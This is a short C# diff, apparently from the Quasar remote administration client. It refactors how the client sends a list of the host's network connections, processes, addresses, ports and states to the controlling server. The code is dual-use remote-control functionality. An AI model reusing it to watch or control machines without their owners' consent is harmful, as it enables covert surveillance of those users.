@@ -2,9 +2,8 @@
 using System.Diagnostics;
 using System.Net;
 using System.Runtime.InteropServices;
+using Quasar.Common.Packets;
 using xClient.Core.Networking;
-using xClient.Core.Packets.ClientPackets;
-using xClient.Core.Packets.ServerPackets;
 
 namespace xClient.Core.Commands
 {
@@ -41,8 +40,15 @@ namespace xClient.Core.Commands
                 }
             }
 
-            new GetConnectionsResponse(processes, localAddresses, localPorts, remoteAddresses, remotePorts, states)
-                .Execute(client);
+            client.Send(new GetConnectionsResponse
+            {
+                Processes = processes,
+                LocalAddresses = localAddresses,
+                LocalPorts = localPorts,
+                RemoteAddresses = remoteAddresses,
+                RemotePorts = remotePorts,
+                States = states
+            });
         }
 
         public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
